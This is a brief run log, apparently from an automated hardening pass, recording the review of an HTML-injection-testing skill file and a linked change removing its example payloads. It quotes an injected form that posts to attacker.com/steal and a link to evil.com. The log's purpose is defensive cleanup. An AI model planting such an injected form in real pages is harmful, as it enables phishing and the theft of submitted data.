# Run Log: 2026-07-02

- **Target:** skills/html-injection-testing
- **Why it was selected:** Found active phishing and defacement payloads using attacker.com and evil.com domains.
- **Evidence reviewed:** Investigated SKILL.md and found multiple instances of attacker.com and evil.com used in example HTML injection payloads (e.g. `<form action="http://attacker.com/steal" method="POST">`, `<a href="http://evil.com">Click</a>`).
- **Files changed:** `skills/html-injection-testing/SKILL.md`
- **Linked PR:** PR-html-injection-testing-hardening
- **Next action:** Monitor for re-introduction of active payloads.
